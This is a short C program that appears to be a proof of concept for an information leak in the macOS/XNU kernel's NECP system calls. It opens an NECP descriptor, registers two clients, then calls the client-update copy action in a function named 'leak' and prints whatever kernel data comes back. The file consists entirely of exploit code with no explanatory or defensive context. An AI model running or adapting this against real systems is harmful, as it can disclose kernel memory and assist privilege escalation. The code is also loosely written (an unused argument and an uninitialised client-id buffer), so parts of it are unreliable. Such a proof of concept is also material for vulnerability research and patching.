#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/_types.h>
//#include <net/necp.h>

int allocation(){
	int fd = syscall(SYS_necp_open, 4);
	if(fd < 0){
		perror("SYS_necp_open");
		exit(0);
	}
	return fd;
}

void add_client(int fd, size_t id){
	// 16 bytes memory for uuid
	size_t clientid[2];
	char buffer[0x20] = "hello necp";
	size_t buffer_size = 0x20;
	syscall(SYS_necp_client_action, fd, 1, clientid, 16, buffer, buffer_size);
	printf("get client id: %llx %llx\n", clientid[0], clientid[1]);
}

void leak(int fd){
	char idlen[0x20];
	int id_len = sizeof(__darwin_uuid_t);
	char buffer[512] = {};
	size_t size = 512;
	syscall(SYS_necp_client_action, fd, 15 /*NECP_CLIENT_ACTION_COPY_CLIENT_UPDATE*/, idlen, id_len, buffer, size);
	printf("got buffer: %s\n", buffer);
}

int main(){

	int fd = allocation();
	add_client(fd, 1);
	add_client(fd, 3);
	leak(fd);
	close(fd);
}
